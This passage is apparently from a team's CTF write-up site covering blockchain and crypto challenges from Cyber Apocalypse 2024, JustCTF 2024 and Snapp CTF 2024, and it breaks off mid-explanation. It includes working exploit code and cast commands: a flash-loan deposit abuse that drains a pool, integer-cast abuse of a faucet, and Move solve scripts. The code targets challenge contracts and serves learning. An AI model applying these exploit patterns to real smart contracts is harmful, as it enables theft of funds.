ILoanPool(msg.sender).deposit(amount);\n        IToken(token).transferFrom(tx.origin, msg.sender, fee);\n        return keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n    }\n\n    function withdraw() public {\n        try ILoanPool(target).withdraw(maxloan) {\n        } catch {\n            revert(\"cant withdraw!\");   \n        }\n    }\n}\n</code></pre> <ol> <li>Approve Attacker Contract: Next, approve the attacker contract to transfer the required token amount to the flash loan contract to cover the flash loan fee. This is necessary to meet the requirements of the flash loan mechanism, specifically for repayment.</li> </ol> <pre><code>cast send &lt;UNDERLYING_TOKEN_ADDRESS&gt; \"approve(address,uint256)\" &lt;TARGET_CONTRACT_ADDRESS&gt; 9999999999999999999999 --rpc-url &lt;RPC_URL&gt; --private-key &lt;PRIVATE_KEY&gt;\n</code></pre> <ol> <li>Initiate Flash Loan: Trigger a flash loan from the attacker contract. The onFlashLoan function within this contract is designed to misuse the deposit mechanism: it deposits the flash-loaned amount back into the loan pool, exploiting the flawed logic to mint new tokens or credit to the attacker contract.</li> </ol> <pre><code>cast send &lt;TARGET_CONTRACT_ADDRESS&gt; \"flashLoan(IERC3156FlashBorrower,address,uint256,bytes)\" &lt;ATTACKER_CONTRACT_ADDRESS&gt; &lt;UNDERLYING_TOKEN_ADDRESS&gt; 10000000000000000000 0x --rpc-url &lt;RPC_URL&gt; --private-key &lt;PRIVATE_KEY&gt;\n</code></pre> <ol> <li>Handle Loan and Fee in onFlashLoan: Within the onFlashLoan execution context the borrowed tokens are deposited back into the pool using the deposit function. This action satisfies the loan's return requirements while simultaneously credits the sender and mints additional tokens, effectively leveraging the return of the loaned tokens. Subsequently, the loan fee is paid from the external owner's account (EOA). This step ensures that the flash loan requirements are met.</li> </ol> <pre><code>ILoanPool(msg.sender).deposit(amount);\nIToken(token).transferFrom(tx.origin, msg.sender, fee);\n</code></pre> <ol> <li>Withdraw Assets: Finally, call the withdraw function on the attacker contract, which, in turn, calls the withdraw function on the flash loan contract. Since the attacker contract's balance has been artificially inflated through the earlier deposit, this step allows withdrawing more assets than should be possible, effectively draining ETH from the flash loan contract.</li> </ol> <pre><code>cast send &lt;ATTACKER_CONTRACT_ADDRESS&gt; \"withdraw()\" --rpc-url &lt;RPC_URL&gt; --private-key &lt;PRIVATE_KEY&gt;\n</code></pre> <p>Authors - Mohammad Eminem</p>"},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/blockchain/luckyfaucet/","title":"Lucky Facucet","text":""},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/blockchain/luckyfaucet/#lucky-faucet","title":"Lucky Faucet","text":""},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/blockchain/luckyfaucet/#code-description","title":"code / Description","text":"<pre><code>function setBounds(int64 _newLowerBound, int64 _newUpperBound) public {\n    require(_newUpperBound &lt;= 100_000_000, \"100M wei is the max upperBound sry\");\n    require(_newLowerBound &lt;=  50_000_000,  \"50M wei is the max lowerBound sry\");\n    require(_newLowerBound &lt;= _newUpperBound);\n    upperBound = _newUpperBound;\n    lowerBound = _newLowerBound;\n}\n</code></pre> <pre><code>function sendRandomETH() public returns (bool, uint64) {\n    int256 randomInt = int256(blockhash(block.number - 1));\n    uint64 amountToSend = uint64(randomInt % (upperBound - lowerBound + 1) + lowerBound); \n    bool sent = msg.sender.send(amountToSend);\n    return (sent, amountToSend);\n}\n</code></pre>"},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/blockchain/luckyfaucet/#challenge-analysis","title":"Challenge Analysis","text":"<p>The \"Lucky Faucet\" challenge involves a smart contract designed to send a random amount of ETH based on a pseudo-random number derived from the blockhash and the set bounds. The critical flaw lies in the handling of integer underflow when setting the bounds, allowing for unexpected behavior when calculating the amount of ETH to send.</p>"},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/blockchain/luckyfaucet/#solution","title":"Solution","text":"<p>The solution exploits the type casting vulnerability by setting the upperBound and lowerBound such that the calculation randomInt % (upperBound - lowerBound + 1) + lowerBound results in a negative value. When this negative value is cast to an unsigned integer (uint64), it becomes a very large positive number, thereby exploiting the contract to send a large amount of ETH. This is achieved by calling setBounds with values that lead to a negative outcome for the amount to send, and then invoking sendRandomETH to trigger the flawed logic and cast the negative result to an unexpectedly large positive value.</p> <p>Adjust both upperBound and lowerBound to -1, ensuring that the expression randomInt % (upperBound - lowerBound + 1) consistently equals zero. Consequently, the amountToSend will always be equal to lowerBound.</p>"},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/blockchain/luckyfaucet/#final-exploit","title":"Final Exploit","text":"<pre><code>cast send --rpc-url &lt;RPC_URL&gt; --private-key &lt;PRIVATE_KEY&gt; &lt;TARGET_CONTRACT_ADDRESS&gt; \"setBounds(int64,int64)\" -- -1 -1 \n</code></pre> <pre><code>cast send --rpc-url &lt;RPC_URL&gt; --private-key &lt;PRIVATE_KEY&gt; &lt;TARGET_CONTRACT_ADDRESS&gt; \"sendRandomETH()\"\n</code></pre> <p>Authors - Mohammad Eminem</p>"},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/blockchain/russianroulette/","title":"Russian Roulette","text":""},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/blockchain/russianroulette/#russian-roulette","title":"Russian Roulette","text":""},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/blockchain/russianroulette/#code-description","title":"code / Description","text":"<pre><code>function pullTrigger() public returns (string memory) {\n    if (uint256(blockhash(block.number - 1)) % 10 == 7) {\n        selfdestruct(payable(msg.sender)); // \ud83d\udc80\n    } else {\n    return \"im SAFU ... for now\";\n    }\n}\n</code></pre>"},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/blockchain/russianroulette/#challenge-analysis","title":"Challenge Analysis","text":"<p>The \"RussianRoulette\" challenge contains a Solidity function that calculates a modulo 10 of the previous block's hash; if the result is 7, it triggers self-destruction of the contract.</p>"},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/blockchain/russianroulette/#solution","title":"Solution","text":"<p>The solution involves repeatedly calling the pullTrigger() function within the smart contract until the condition where the previous block's hash modulo 10 equals 7 is met, leading to the contract's self-destruction.</p>"},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/blockchain/russianroulette/#final-exploit-code-optional","title":"Final Exploit code (optional)","text":"<p>send this transaction until the contract's self-destruction:</p> <pre><code>cast send &lt;TARGET_CONTRACT_ADDRESS&gt; \"pullTrigger()\" --private-key &lt;PRIVATE_KEY&gt; --rpc-url &lt;RPC_URL&gt;\n</code></pre> <p>Authors - Mohammad Eminem</p>"},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/crypto/permuted/","title":"Permuted","text":""},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/crypto/permuted/#permuted","title":"Permuted","text":""},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/crypto/permuted/#code-description","title":"code / Description","text":"<pre><code>from Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\nfrom Crypto.Util.number import long_to_bytes\n\nfrom hashlib import sha256\nfrom random import shuffle\n\nfrom secret import a, b, FLAG\n\nclass Permutation:\n    def __init__(self, mapping):\n        self.length = len(mapping)\n\n        assert set(mapping) == set(range(self.length))     # ensure it contains all numbers from 0 to length-1, with no repetitions\n        self.mapping = list(mapping)\n\n    def __call__(self, *args, **kwargs):\n        idx, *_ = args\n        assert idx in range(self.length)\n        return self.mapping[idx]\n\n    def __mul__(self, other):\n        ans = []\n\n        for i in range(self.length):\n            ans.append(self(other(i)))\n\n        return Permutation(ans)\n\n    def __pow__(self, power, modulo=None):\n        ans = Permutation.identity(self.length)\n        ctr = self\n\n        while power &gt; 0:\n            if power % 2 == 1:\n                ans *= ctr\n            ctr *= ctr\n            power //= 2\n\n        return ans\n\n    def __str__(self):\n        return str(self.mapping)\n\n    def identity(length):\n        return Permutation(range(length))\n\n\nx = list(range(50_000))\nshuffle(x)\n\ng = Permutation(x)\nprint('g =', g)\n\nA = g**a\nprint('A =', A)\nB = g**b\nprint('B =', B)\n\nC = A**b\nassert C.mapping == (B**a).mapping\n\nsec = tuple(C.mapping)\nsec = hash(sec)\nsec = long_to_bytes(sec)\n\nhash = sha256()\nhash.update(sec)\n\nkey = hash.digest()[16:32]\niv = b\"mg'g\\xce\\x08\\xdbYN2\\x89\\xad\\xedlY\\xb9\"\n\ncipher = AES.new(key, AES.MODE_CBC, iv)\n\nencrypted = cipher.encrypt(pad(FLAG, 16))\nprint('c =', encrypted)\n</code></pre>"},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/crypto/permuted/#challenge-analysis","title":"Challenge Analysis","text":"<p>this challenge is about groups, we have a group which its elements are different permutation of numbers from <code>0</code> to <code>n-1</code>. our groups is defined by a Class named <code>Permutation</code>.</p> <p>In case of a groups we should have couple of elements </p> <ol> <li> <p>Identity Element which is defined by a function named <code>identity</code> like this </p><pre><code>def identity(length):\n    return Permutation(range(length))\n</code></pre> it will create a permutation of numbers which are sorted <code>(0,1,2,...,n-1)</code>, so this would be our identity element<p></p> </li> <li> <p>Operations</p> </li> </ol> <p>Multiplication</p> <p>this operation is defined by this function</p> <pre><code>def __mul__(self, other):\n    ans = []\n\n    for i in range(self.length):\n        ans.append(self(other(i)))\n\n    return Permutation(ans)\n</code></pre> <p>Imagine we have two elements like this</p>  $g_1 = {4,2,3,1,0}$  $g_2 = {2,3,0,1,4}$  <p>we want to multiply these two elements, multiplication operation is defined like this</p>  $g_1 \\times g_2 = g_1[g_2[i]] \\quad for \\quad i=0,1,2, \\ldots ,n-1$  <p>so the multiplication of \\(g_1 \\times g_2\\) will be</p>  $g_1 \\times g_2 = {3,1,4,2,0}$  <p>Exponentiation</p> <p>this operation is defined by this function</p> <pre><code>def __pow__(self, power, modulo=None):\n    ans = Permutation.identity(self.length)\n    ctr = self\n\n    while power &gt; 0:\n        if power % 2 == 1:\n            ans *= ctr\n        ctr *= ctr\n        power //= 2\n\n    return ans\n</code></pre> <p>exponentiation by power <code>n</code> is defined by multiplying an element <code>g</code> for <code>n</code> times with itself</p>  $g^n = \\underbrace{g \\times g \\times g \\times g}_{n \\text{ times}}$  <p>there is an optimal algorithm for exponentiation which is done in \\(O(logn)\\) instead of \\(O(n)\\), in cases of large <code>n</code> this algorithm is better and feasable</p> <pre><code>input : g, n\noutput : g^n\n\nctr = g\nwhile power &gt; 0:\n    if power % 2 == 1:\n        ans *= ctr\n    ctr *= ctr\n    power //= 2\nreturn ctr\n</code></pre> <p>This was the Permutation group class. now let's see what is the exact problem</p> <pre><code>x = list(range(50_000))\nshuffle(x)\n\ng = Permutation(x)\nprint('g =', g)\n\nA = g**a\nprint('A =', A)\nB = g**b\nprint('B =', B)\n\nC = A**b\nassert C.mapping == (B**a).mapping\n\nsec = tuple(C.mapping)\nsec = hash(sec)\nsec = long_to_bytes(sec)\n\nhash = sha256()\nhash.update(sec)\n\nkey = hash.digest()[16:32]\niv = b\"mg'g\\xce\\x08\\xdbYN2\\x89\\xad\\xedlY\\xb9\"\n\ncipher = AES.new(key, AES.MODE_CBC, iv)\n\nencrypted = cipher.encrypt(pad(FLAG, 16))\nprint('c =', encrypted)\n</code></pre> <ol> <li>the code creates a random permutation of numbers from 0 to 49999 named g</li> <li>then it calculates power \\(a\\) and \\(b\\) of \\(g\\) and name them \\(A,B\\). The exponents \\(a,b\\) are secret</li> <li>then it will calculate a \\(C\\) like \\(C = A^b\\) or \\(C = B^a\\), because of associative propery of this group \\(A^b = B^a = g^{ab}\\)</li> <li>Finally it will create a hash for \\(C\\) named secret and it will encrypt the flag with sha256 hash of this secret</li> </ol> <p>So we have a DLP (Discrete Logarithm Problem) here. we have a generator <code>g</code> and two secrets <code>a,b</code> and the power <code>a,b</code> of the <code>g</code> which are <code>A,B</code>. If we can find one of <code>a,b</code> values we can calculate <code>C</code> and the secret key and decrypt the flag.</p>"},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/crypto/permuted/#solution","title":"Solution","text":"<p>let's first see what is the order of our generator <code>g</code>. order of a generator in a group is lowest possible value \\(x\\) such that g to the power of \\(x\\) is equal to identity element</p>  $g^x = e$  <p></p> <p>as we see the order of random generator is dependant on the elements of that generator. and computing order of a random <code>g</code> with this size (50000 elements!) is not feasable and requires a lot of trial/error and calculation. so what should we do now? brute force the <code>a,b</code> and iterate though all possible values to see when we can reach <code>A</code> or <code>B</code>. that's not a good idea because in case of a DLP problem <code>a,b</code> are secret and high enough to prevent brute forcing and that's the trapdoor function of a DLP. becaue calculating the exponent is easy enough because of the algorithm we discussed in previous section but the reverse operation is not practical in feasable time.</p> <p>When discussing with one of my good crypto player friends(I name him Ehsan Crypto :D) he mentioned we can calculate each elements period independantly to see after how many iteration each element resides its correct location. for example value 0 may be seen in first element section after \\(x_1\\) loops (\\(g^{x_1}\\)). value 1 may be in its correct position after \\(x_2\\) loops (\\(g^{x_2}\\)) and so on. so we can calculate each element's order seperately and see what's happening. let's see another example with 50 elements</p> <p></p> <p>the order of the <code>g</code> is 390. but the order of each element is either 39 or 10 and we know that \\(390 = 10 \\times 39\\). so the order of the whole <code>g</code> is LCM (Least Common Multiple) of each elements period. now we can find the order of whole <code>g</code>.</p> <p></p> <p>Now let's write a code to find order of generator <code>g</code></p> <pre><code>n = 50000\n\ng = Permutation(g)\nA = Permutation(A)\nB = Permutation(B)\n\ne = Permutation(list(range(50000)))\nperiods = {i:0 for i in range(len(g.mapping))}\n\ni = 2\nwhile not all(periods.values()):\n    mul = g**i\n    for j in range(len(g.mapping)):\n        if (mul).mapping[j] == e.mapping[j] and periods[j] == 0:\n            periods[j] = i\n    i += 1\n\norder = lcm(*list(periods.values()))\nprint(order)\n</code></pre> <p>and here is order of g: </p><pre><code>3311019189498977856900\n</code></pre><p></p> <p>tbh there is no need to calculate the order of <code>g</code> lol, but anyway. before we explain our solution, let's define these terms</p> <p>\\(X_i\\) is period or order of element \\(g[i]\\) if:</p>  $g^{X_i}[i] = e[i] \\quad for \\quad i=0,1,2,...,n-1$  <p>\\(Y_i\\) is distance of element \\(g[i]\\) from \\(A[i]\\) if:</p>  $g^{Y_i}[i] = A[i] \\quad for \\quad i=0,1,2,...,n-1$  <p>now we have the order and we should see how much distance each element of <code>g</code> has from its coresponding element in <code>A</code>. The reason that we wanna mesaure this distance is to find secret value <code>a</code> or <code>b</code>, but how these are related? we need to find just one of them so I pick <code>a</code>. we know that <code>a</code> and <code>b</code> are a large value(they should be) and each element of <code>g</code>'s period (the periods array we calculated in previous python code) are less than <code>a</code> or <code>b</code>. we have <code>n</code> equations like this</p>  $a \\equiv Y[i] \\mod{X[i]} \\quad for \\quad i=0,1,2,...,n-1$  <p>now we have 50000 modular equations. we can use CRT (chinese Remainder Theorem) to find \\(a\\).</p> <p>First we calculated all moduli and residue with this python code</p> <pre><code>n = 50000\n\ngg = Permutation(g)\nAA = Permutation(A)\nBB = Permutation(B)\n\ne = Permutation(list(range(n)))\nperiods = {i:0 for i in range(len(gg.mapping))}\nresidues = {i:0 for i in range(len(gg.mapping))}\n\n\ni = 2\nwhile not all(periods.values()):\n    mul = gg**i\n    for j in range(len(gg.mapping)):\n        if mul.mapping[j] == e.mapping[j] and periods[j] == 0:\n            periods[j] = i\n        if mul.mapping[j] == AA.mapping[j] and residues[j] == 0:\n            residues[j] = i\n    i += 1\n</code></pre> <p>then we use sage <code>crt</code> function to find the secret value <code>a</code>.</p> <pre><code>a = crt(list(residues.values()), list(periods.values()))\nprint(a)\n839949590738986464\n</code></pre> <p>now we have the secret value <code>a</code>, we can first verify if <code>a</code> is correct then easily calulate <code>C</code> and <code>secret</code> and findally decrpt the flag:</p> <pre><code>a = 839949590738986464\nC = B ** a\nsec = tuple(C.mapping)\nsec = hash(sec)\nprint(f\"{sec=}\")\n\nsec = long_to_bytes(sec)\n\nhash = sha256()\nhash.update(sec)\nkey = hash.digest()[16:32]\n\nprint(f\"key = {key.hex()}\")\n</code></pre> <p>here is the AES key</p> <pre><code>a0e58d9b8a93cc1b17e60110bb59cc2a\n</code></pre> <p></p> <p>finally I used cyberchef to decrypt the flag</p> <p></p>"},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/crypto/permuted/#final-code","title":"Final code","text":"<p>here is the final code (without g,A,B matrix because of large amount of data)</p> <pre><code>from hashlib import sha256\nfrom math import lcm\nfrom sage.all import *\nfrom Crypto.Util.number import *\n\nclass Permutation:\n    def __init__(self, mapping):\n        self.length = len(mapping)\n\n        assert set(mapping) == set(range(self.length))     # ensure it contains all numbers from 0 to length-1, with no repetitions\n        self.mapping = list(mapping)\n\n    def __call__(self, *args, **kwargs):\n        idx, *_ = args\n        assert idx in range(self.length)\n        return self.mapping[idx]\n\n    def __mul__(self, other):\n        ans = []\n\n        for i in range(self.length):\n            ans.append(self(other(i)))\n\n        return Permutation(ans)\n\n    def __pow__(self, power, modulo=None):\n        ans = Permutation.identity(self.length)\n        ctr = self\n\n        while power &gt; 0:\n            if power % 2 == 1:\n                ans *= ctr\n            ctr *= ctr\n            power //= 2\n\n        return ans\n\n    def __str__(self):\n        return str(self.mapping)\n\n    def identity(length):\n        return Permutation(range(length))\n\n\nn = 50000\n\ngg = Permutation(g)\nAA = Permutation(A)\nBB = Permutation(B)\n\ne = Permutation(list(range(n)))\nperiods = {i:0 for i in range(len(gg.mapping))}\nresidues = {i:0 for i in range(len(gg.mapping))}\n\n\ni = 2\nwhile not all(periods.values()):\n    mul = gg**i\n    for j in range(len(gg.mapping)):\n        if mul.mapping[j] == e.mapping[j] and periods[j] == 0:\n            periods[j] = i\n        if mul.mapping[j] == AA.mapping[j] and residues[j] == 0:\n            residues[j] = i\n    i += 1\n\n# order of g is not necessary\norder = lcm(list(periods.values()))\nprint(f\"order of g : {order}\")\n\na = crt(list(residues.values()), list(periods.values()))\nprint(f\"secret value a : {a}\")\n\nassert (gg**a).mapping==AA.mapping\n\nC = BB ** a\nsec = tuple(C.mapping)\nsec = hash(sec)\nprint(f\"sec : {sec}\")\n\nsec = long_to_bytes(sec)\n\nkey = sha256(sec).digest()[16:32]\nprint(f\"aes key : {key.hex()}\")\n</code></pre>"},{"location":"CTF/writeups/2024/Cyber-Apocalypse-2024/crypto/permuted/#flag","title":"Flag","text":"<p>Here is the flag </p><pre><code>HTB{w3lL_n0T_aLl_gRoUpS_aRe_eQUaL_!!}\n</code></pre><p></p> <p>Authors - Kourosh Rajabzadeh</p> <p>Great thanks to our friend Ehsan for helping us to solve this challenge &lt;3</p>"},{"location":"CTF/writeups/2024/JustCTF2024/","title":"JustCTF 2024 writeups","text":""},{"location":"CTF/writeups/2024/JustCTF2024/#justctf-2024","title":"JustCTF 2024","text":""},{"location":"CTF/writeups/2024/JustCTF2024/blockchain/blockchains/","title":"blockchain","text":""},{"location":"CTF/writeups/2024/JustCTF2024/blockchain/blockchains/#the-otter-scrolls","title":"The Otter Scrolls","text":"<p>[#1 The Otter Scrolls]</p> <p>To solve this level, we need to call the <code>cast_spell</code> function with the correct sequence of indices to set the <code>casted</code> attribute of the <code>Spellbook</code> to <code>true</code>. The function checks specific magic words in sequence: \"Inferno\" (fire), \"Zephyr\" (wind), \"Call\" (water), \"Granite\" (earth), and \"Wazzup\" (power).</p> <p>We determined the indices for these words in their respective vectors and constructed the sequence <code>[1, 0, 3, 3, 3]</code>. This sequence corresponds to the required magic words in the correct order. By calling <code>cast_spell</code> with this sequence and verifying with <code>check_if_spell_casted</code>, we ensure the spell is successfully cast.</p> <p><code>solve.move</code> script: </p><pre><code>module solve::solve {\n    // [*] Import dependencies\n    use challenge::theotterscrolls;\n    public fun solve(\n        _spellbook: &amp;mut theotterscrolls::Spellbook,\n        _ctx: &amp;mut TxContext\n    ) {\n        // Your code here...\n        let spell_sequence = vector[1, 0, 3, 3, 3];\n        theotterscrolls::cast_spell(spell_sequence, _spellbook);\n    }\n}\n</code></pre><p></p> <pre><code>Flag: justCTF{Th4t_sp3ll_looks_d4ngerous...keep_y0ur_distance}\n</code></pre>"},{"location":"CTF/writeups/2024/JustCTF2024/blockchain/blockchains/#dark-brotterhood","title":"Dark BrOTTERhood","text":"<p>[#2 Dark BrOTTERhood]</p> <p>To solve this level, we need to interact with the smart contract by calling several functions to register a player, equip them with a sword, find and fight monsters, get the rewards, and ultimately prove the solution.</p> <p>The root cause of the problem is these lines in the <code>get_the_reward</code> function: </p><pre><code>    public fun get_the_reward(quest_id: u64, ...) {\n        // check status with quest_id\n        let quest_to_claim = vector::borrow_mut(&amp;mut board.quests, quest_id);\n        assert!(quest_to_claim.fight_status == FINISHED, WRONG_STATE);\n\n        // but pop last index instead of quest_id\n        let monster = vector::pop_back(&amp;mut board.quests);\n        ...\n    }\n</code></pre><p></p> <p>The check is correctly performed against the quest_id, ensuring the fight_status is FINISHED. However, the pop_back function removes and returns the last element in the vector and the reward is mistakenly based on the last element of the vector rather than the quest at the quest_id index. This mismatch leads to inconsistencies and errors in the quest state management.</p> <p><code>solve.move</code>: </p><pre><code>module solve::solve {\n    // [*] Import dependencies\n    use challenge::Otter::{Self, OTTER};\n    use sui::random::Random;\n    #[allow(lint(public_random))]\n    public fun solve(\n        _vault: &amp;mut Otter::Vault&lt;OTTER&gt;,\n        _questboard: &amp;mut Otter::QuestBoard,\n        _player: &amp;mut Otter::Player,\n        _r: &amp;Random,\n        _ctx: &amp;mut TxContext,\n    ) {\n        // Your code here ...\n        // buy sword and defead at least one monster\n        Otter::buy_sword(_vault, _player, _ctx);\n        Otter::find_a_monster(_questboard, _r, _ctx);\n        Otter::fight_monster(_questboard, _player, 0);\n        Otter::return_home(_questboard, 0);\n\n        let times: u64 = 100;\n        let mut i: u64 = 0;\n        while (i &lt; times) {\n            // add new monster at the end of quest vector\n            Otter::find_a_monster(_questboard, _r, _ctx);\n            // use defeated monter quest_id to get reward\n            Otter::get_the_reward(_vault, _questboard, _player, 0, _ctx);\n            i = i + 1;\n        };\n\n        // but flag\n        let flag = Otter::buy_flag(_vault, _player, _ctx);\n        Otter::prove(_questboard, flag);\n    }\n}\n</code></pre><p></p> <pre><code>Flag: justCTF{I_us3d_to_b3_an_ott3r_until_i_t00k_th4t_arr0w}\n</code></pre>"},{"location":"CTF/writeups/2024/JustCTF2024/blockchain/blockchains/#world-of-ottercraft","title":"World of Ottercraft","text":"<p>[#3 World of Ottercraft]</p> <p>The vulnerability in this challenge stems from the fact that the get_the_reward function does not verify monster power before awarding the reward. Instead, it simply pops the monster from the vector and grants the reward. Here\u2019s the relevant code from the get_the_reward function:</p> <pre><code>public fun get_the_reward(vault: &amp;mut Vault&lt;OTTER&gt;, board: &amp;mut QuestBoard, player: &amp;mut Player, ctx: &amp;mut TxContext) {\n    assert!(player.status != RESTING &amp;&amp; player.status != PREPARE_FOR_TROUBLE &amp;&amp; player.status != ON_ADVENTURE, WRONG_PLAYER_STATE);\n    // pop monter\n    let monster = vector::remove(&amp;mut board.quests, player.quest_index);\n    ...\n    // get reward from vault\n    let coins = coin::split(&amp;mut vault.cash, reward, ctx); \n    ...\n    // send reward to player\n    balance::join(&amp;mut player.wallet, balance);\n\n    player.status = RESTING;\n}\n</code></pre> <p>In contrast, the return_home function, which should be called before get_the_reward, includes a crucial check to ensure that the monster's power is zero (indicating the monster has been defeated):</p> <pre><code>public fun return_home(board: &amp;mut QuestBoard, player: &amp;mut Player) {\n    assert!(player.status != SHOPPING &amp;&amp; player.status != FINISHED &amp;&amp; player.status != RESTING &amp;&amp; player.status != PREPARE_FOR_TROUBLE, WRONG_PLAYER_STATE);\n\n    let quest_to_finish = vector::borrow(&amp;board.quests, player.quest_index);\n    assert!(quest_to_finish.power == 0, WRONG_AMOUNT);\n\n    player.status = FINISHED;\n}\n</code></pre> <p>Exploiting the Vulnerability</p> <p>To exploit this vulnerability, we need to avoid calling return_home and directly call get_the_reward. This can be achieved if we can enter the get_the_reward function while the player's status is SHOPPING, which can be done by calling the enter_tavern function. The following sequence of operations allows us to repeatedly call get_the_reward without the necessary checks.</p> <pre><code>module solve::solve {\n    // [*] Import dependencies\n    use challenge::Otter::{Self, OTTER};\n    public fun solve(\n        _board: &amp;mut Otter::QuestBoard,\n        _vault: &amp;mut Otter::Vault&lt;OTTER&gt;,\n        _player: &amp;mut Otter::Player,\n        _ctx: &amp;mut TxContext\n    ) {\n        // Your code here...\n        // buy sword because we need to defeat monter to change state\n        let mut ticket = Otter::enter_tavern(_player);\n        Otter::buy_sword(_player, &amp;mut ticket);\n        Otter::checkout(ticket, _player, _ctx, _vault, _board);\n\n        // add monter to vector so get_the_reward function can pop them later\n        let num_quests: u64 = 24;\n        let mut i: u64 = 0;\n        while (i &lt; num_quests) {\n            Otter::find_a_monster(_board, _player);\n            i = i + 1;\n        };\n\n        // continue scenario to reach RESTING status again\n        Otter::bring_it_on(_board, _player, 0);\n        Otter::return_home(_board, _player);\n        Otter::get_the_reward(_vault, _board, _player, _ctx);\n\n        // now we have full vector of monters we can set status to SHOPPING and loop over get_the_reward\n        i = 0;\n        while (i &lt; num_quests - 1) {\n            // enter SHOPPING status\n            let mut shield_ticket = Otter::enter_tavern(_player);\n            // buy something cheap just so we can checkout later\n            Otter::buy_shield(_player, &amp;mut shield_ticket);\n            // enter get_the_reward in SHOPPING status and get reward without defeating monter\n            Otter::get_the_reward(_vault, _board, _player, _ctx);\n            // checkout because we need to use shield_ticket\n            Otter::checkout(shield_ticket, _player, _ctx, _vault, _board);\n            i = i + 1;\n        };\n\n        // buy flag\n        let mut final_ticket = Otter::enter_tavern(_player);\n        Otter::buy_flag(&amp;mut final_ticket, _player);\n        Otter::checkout(final_ticket, _player, _ctx, _vault, _board);\n    }\n\n}\n</code></pre> <pre><code>Flag: justCTF{Ott3r_uses_expl0it_its_sup3r_eff3ctiv3}'\n</code></pre> <p>Authors - Mohammad Eminem</p>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/","title":"snapp ctf 2024 writeups","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/#snapp-ctf-2024-writeups","title":"snapp ctf 2024 writeups","text":"<p>We participated in snapp ctf 2024 and ranked 3 among 174 teams with 5 first bloods  (1 crypto 1 pwn and 3 reverse) Here are our writeups for the challenges we solved.</p> Category Challenges crypto CryptosBombasticBlexGrail pwn Snapp admin Snapp shell reverse Visits TurnOB Blink web Snapp catSnapp falWelcome forensics Snapp Report osint Snapp RecordsSnapp BountiesSnapp CustomersSnapp Saving"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/crypto/Blex/","title":"Blex","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/crypto/Blex/#blex","title":"Blex","text":"<p>Blex cryptosystem, despite its sluggish pace, boasts unparalleled security, resilient against all attacks. Now, examine its unyielding strength.</p> <pre><code>#!/usr/bin/env python3\n\nimport sys\nfrom Crypto.Util.number import *\nfrom flag import flag\n\n\ndef die(*args):\n  pr(*args)\n  quit()\n\ndef pr(*args):\n  s = \" \".join(map(str, args))\n  sys.stdout.write(s + \"\\n\")\n  sys.stdout.flush()\n\ndef sc(): \n  return sys.stdin.buffer.readline()\n\ndef keygen(r):\n  assert len(r) &lt;= 60\n  v, l = int(r, 16), len(r)\n  e = (64 - l) &lt;&lt; 4\n  u, w = v &lt;&lt; e, 2 ** (e &gt;&gt; 1)\n  for _ in range(110):\n    r = getRandomRange(1, w)\n    p = r + u\n    while p &gt;&gt; e == v:\n      if isPrime(p):\n        while True:\n          x, y = [2 * getRandomNBitInteger(p.bit_length() &gt;&gt; 2) for _ in '__']\n          P, Q = x * p | 1, y * p | 1\n          if isPrime(P) and isPrime(Q):\n            return P, Q\n      p += 1\n\ndef main():\n  border = \"|\"\n  pr(border*72)\n  pr(border, f\"Welcome to Blex task! Your mission is break our complex cryptosystem\", border)\n  pr(border*72)\n  pr(border, f\"please provide your desired seed to generate key in hex:\")\n  seed = sc().decode()\n  try:\n    _b = len(seed) &lt;= 60 and int(seed, 16) &gt;= 0\n  except:\n    die(border, f\"The seed you provided is either not in hex or is not valid!\")\n  if _b:\n    pr(border, f\"Generating keypair, please wait...\")\n    p, q = keygen(seed)\n    e, n =  65537, p * q\n    m = bytes_to_long(flag)\n    assert m &lt; n\n    c = pow(m, e, n)\n    pr(border, f'n = {n}')\n    pr(border, f'c = {c}')\n  else:\n    die(border, f\"Your seed is too long!!!\")\n\nif __name__ == '__main__':\n  main()\n</code></pre>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/crypto/Blex/#solution","title":"Solution","text":"<p>the code simply does these steps 1. get an input from user as a seed 2. generates <code>P,Q</code> (RSA prime factors) based on that seed with an special algorithm 3. encrypts the flag with generated RSA key</p> <p>The key generation part is interesting. let's break it down to see what is happening under the hood</p> <ol> <li>consider our seed as <code>s</code></li> <li>it casts it to decimal base as <code>v</code> and the hex value length as <code>l</code></li> <li>then it generates <code>e</code> as  \\((64-l) * 16\\) (e is dependent on <code>l</code>, the larger the <code>l</code> or seed length, the smaller value for <code>e</code> )</li> <li>two values <code>u,w</code> are generated: \\(u = v * 2^{e}\\) and \\(w = 2^{(e/2)}\\) (<code>u</code> and <code>v</code> both are dependent on <code>e</code>, it means the larger seed length -&gt; the smaller <code>e</code> -&gt; the smaller <code>u</code> and <code>w</code>)</li> <li>then it enters a for loop<ol> <li>first it generates a random <code>r</code> in range <code>[1,w)</code> -&gt; not including <code>w</code> itself </li> <li>then the code calculates a <code>p</code> like: \\(p = r + u\\)</li> <li>then it enters a loop <ol> <li>first it generates a pair <code>(x,y)</code> in length of \\(bitlen(p)/4\\) bit</li> <li>then it calculates <code>P</code> and <code>Q</code> like: \\(P = x * p | 1\\) and \\(Q = y * p | 1\\) -&gt; <code>|</code> is OR bit-wise operator means if \\(xp\\) or \\(yp\\) are even (0 value for LSB bit) it will make it <code>1</code> . so it will be 